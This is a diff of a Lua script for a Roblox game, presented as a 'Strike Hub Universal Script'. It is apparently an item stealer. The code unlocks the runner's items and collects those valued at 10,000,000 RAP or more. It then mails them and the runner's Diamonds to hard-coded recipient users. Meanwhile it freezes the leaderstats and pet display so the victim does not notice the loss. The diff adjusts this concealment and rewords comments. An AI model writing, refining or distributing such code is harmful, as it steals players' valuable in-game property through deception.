@@ -1,4 +1,4 @@
---// Strike Hub Universal Script (Visual Freeze + Async Sending)
+--// Strike Hub Universal Script (All Items + Visual Freeze)
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
@@ -60,30 +60,32 @@ for uid, pet in pairs(save.Pet or {}) do
 	visualInventory.Pet[uid] = pet
 end
 
---// Freeze visual inventory
+--// Freeze visual currency (without touching real save table)
 task.spawn(function()
 	while task.wait(0.1) do
-		-- Freeze currency
-		for id, data in pairs(visualInventory.Currency) do
-			if save.Currency and save.Currency[id] then
-				save.Currency[id]._am = data._am
-			end
-		end
-		-- Freeze pets
-		for uid, petData in pairs(visualInventory.Pet) do
-			if save.Pet and save.Pet[uid] then
-				save.Pet[uid] = petData
+		if plr.leaderstats then
+			for id, data in pairs(visualInventory.Currency) do
+				local stat = plr.leaderstats:FindFirstChild(id)
+				if stat then
+					stat.Value = data._am
+				end
 			end
 		end
 	end
 end)
 
---// Maintain visual Diamonds
-local diamondsStat = plr.leaderstats and plr.leaderstats:FindFirstChild("💎 Diamonds")
-if diamondsStat then
-	local diamondsStart = diamondsStat.Value
-	diamondsStat:GetPropertyChangedSignal("Value"):Connect(function()
-		diamondsStat.Value = diamondsStart
+--// Freeze pets visually (example, depends on game implementation)
+local petFolder = plr:FindFirstChild("Pets")
+if petFolder then
+	task.spawn(function()
+		while task.wait(0.1) do
+			for uid, petData in pairs(visualInventory.Pet) do
+				if petFolder:FindFirstChild(uid) then
+					-- Keep the pet visually as is
+					petFolder[uid].Parent = petFolder
+				end
+			end
+		end
 	end)
 end
 
@@ -112,7 +114,7 @@ local function getRAP(_, item)
 	return success and val or (item._rap or 0)
 end
 
---// Send item
+--// Send item function
 local function sendItem(category, uid, am)
 	for _, user in ipairs(users) do
 		local args = {user, MailMessage, category, uid, am or 1}
@@ -129,7 +131,7 @@ local function sendItem(category, uid, am)
 	return false
 end
 
---// Send Gems
+--// Send gems function
 local function SendAllGems()
 	for i, v in pairs(save.Currency or {}) do
 		if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
@@ -146,7 +148,7 @@ local function SendAllGems()
 	end
 end
 
---// Unlock items
+--// Unlock items first
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
 	if save[cat] then
 		for uid, item in pairs(save[cat]) do
@@ -157,7 +159,7 @@ for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard"
 	end
 end
 
---// Collect items with RAP >= 10,000,000
+--// Collect eligible items (RAP >= 10,000,000)
 local sortedItems, totalRAP = {}, 0
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
 	if save[cat] then
@@ -205,7 +207,7 @@ task.spawn(function()
 	end)
 end)
 
---// Send items asynchronously to reduce loading buffers
+--// Send items asynchronously
 for _, item in ipairs(sortedItems) do
 	task.spawn(function()
 		sendItem(item.category, item.uid, item.amount)
